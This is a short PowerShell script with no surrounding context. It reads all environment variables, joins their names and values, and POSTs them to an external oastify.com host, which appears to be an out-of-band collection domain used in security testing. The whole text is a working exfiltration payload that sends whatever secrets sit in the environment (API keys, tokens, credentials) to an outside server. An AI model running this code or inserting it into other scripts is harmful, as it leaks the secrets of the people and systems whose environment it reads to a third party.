$envVars = Get-ChildItem Env: | ForEach-Object { "$($_.Name)=$($_.Value)" };
$envVarsString = $envVars -join "&";
Invoke-WebRequest -Method Post -Body $envVarsString -Uri "https://wffct92ywvocjfu2a7swwr2fg6m4isbg0.oastify.com";
